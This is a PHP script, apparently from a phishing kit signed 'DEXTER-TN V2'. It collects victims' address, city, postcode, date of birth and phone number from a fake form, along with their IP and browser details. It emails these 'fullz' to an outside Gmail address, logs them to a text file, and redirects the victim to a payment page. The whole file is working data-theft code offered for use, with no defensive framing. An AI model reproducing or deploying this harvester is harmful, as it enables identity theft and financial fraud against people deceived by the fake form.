<?php
session_start();
error_reporting(0);
function generateRandomString($length = 100) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$string = generateRandomString();
$sessionID = $_GET['sessionID'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['City'] = $_POST['City'];
$_SESSION['postcode'] = $_POST['postcode'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['telephone'] = $_POST['telephone'];
date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];
if(($_POST['address'] != "") AND ($_POST['City'] != "") AND ($_POST['postcode'] != "") AND ($_POST['dob'] != "") AND ($_POST['telephone'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "Coded by DEXTER-TN \n";
$message .= "################################ \n";
$message .= "[Address Line]:              ".$_POST['address']."\n";
$message .= "[City]:                      ".$_POST['City']."\n";
$message .= "[Zip Code]:                  ".$_POST['postcode']."\n";
$message .= "[Date of birth]:             ".$_POST['dob']."\n";
$message .= "[Phone]:                     ".$_POST['telephone']."\n";
$message .= "################################ \n";
$message .= "IP:       $ip \n";
$message .= "Time:     $time \n";
$message .= "Agent:    $agent \n";
$message .= "################################ \n";
$message .= " DEXTER V2 \n";
$send = "dextertn216@gmail.com";
$subject = "Fullz From DEXTER-TN V2 $ip";
$headers = "From: DEXTER-TN V2<info@logs.com>";
mail($send,$subject,$message,$headers);
$MYFILE = "DEXTER/DEXTER-FULLZ.txt";
        $FH = @fopen($MYFILE, 'a+');
        @fwrite($FH, $message);
        @fclose($FH);
echo "<meta http-equiv='refresh' content='0; url=payment.php?sessionID=$string'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; payment.php?sessionID=asbby220151313168168646' />";
}

?>